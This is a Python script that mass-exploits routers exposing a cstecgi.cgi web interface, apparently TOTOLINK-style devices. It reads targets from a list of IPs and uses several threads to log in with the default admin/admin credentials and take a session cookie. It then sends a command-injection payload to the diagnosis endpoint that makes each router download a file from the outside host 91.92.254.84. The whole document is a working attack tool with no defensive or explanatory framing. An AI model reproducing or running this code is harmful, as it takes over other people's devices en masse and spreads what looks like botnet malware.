import requests
import concurrent.futures

def read_ips_from_file(file_path='ips.txt'):
    with open(file_path, 'r') as file:
        ips = [line.strip() for line in file]
    return ips

def process_ip(ip_port):
    ip, port = ip_port.split(':')

    base_url = f'http://{ip}:{port}'

    try:

        url_login = f'{base_url}/cgi-bin/cstecgi.cgi?action=login'
        headers_login = {
            'Host': f'{ip}:{port}',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36',
            'Connection': 'close'
        }

        payload_login = {'username': 'admin', 'password': 'admin'}

        response_login = requests.post(url_login, headers=headers_login, data=payload_login, allow_redirects=False, timeout=5)

        url_auth = f'{base_url}/formLoginAuth.htm'
        headers_auth = {
            'Host': f'{ip}:{port}',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36',
            'Referer': f'{base_url}/login.html',
            'Connection': 'close'
        }

        params_auth = {'authCode': '1', 'userName': 'admin', 'goURL': 'home.html', 'action': 'login'}

        response_auth = requests.get(url_auth, headers=headers_auth, params=params_auth, allow_redirects=False, timeout=5)

        session_id_cookie = response_auth.headers.get('Set-Cookie', '')
        session_id_value = session_id_cookie.split('SESSION_ID=')[1].split(';')[0] if 'SESSION_ID=' in session_id_cookie else None

        if session_id_value:
            print(f"[*] logged in: {ip}:{port}")

            url_final = f'{base_url}/cgi-bin/cstecgi.cgi'
            headers_final = {
                'Host': f'{ip}:{port}',
                'X-Requested-With': 'XMLHttpRequest',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'Referer': f'{base_url}/advance/diagnosis.html?time=1703412237782',
                'Cookie': f'SESSION_ID={session_id_value}',
                'Connection': 'close'
            }

            payload_final = {"ip": "--c;$(wget http://91.92.254.84/magic)", "num": "3", "topicurl": "setDiagnosisCfg"}

            response_final = requests.post(url_final, headers=headers_final, json=payload_final, timeout=5)

            if response_final.status_code == 200:
                print(f"[+] sent payload: {ip}:{port}!")

    except requests.exceptions.Timeout:
        pass  

ips = read_ips_from_file()

# Set the number of threads
num_threads = 5  # Change this to the desired number of threads

with concurrent.futures.ThreadPoolExecutor(max_workers=num_threads) as executor:
    executor.map(process_ip, ips)
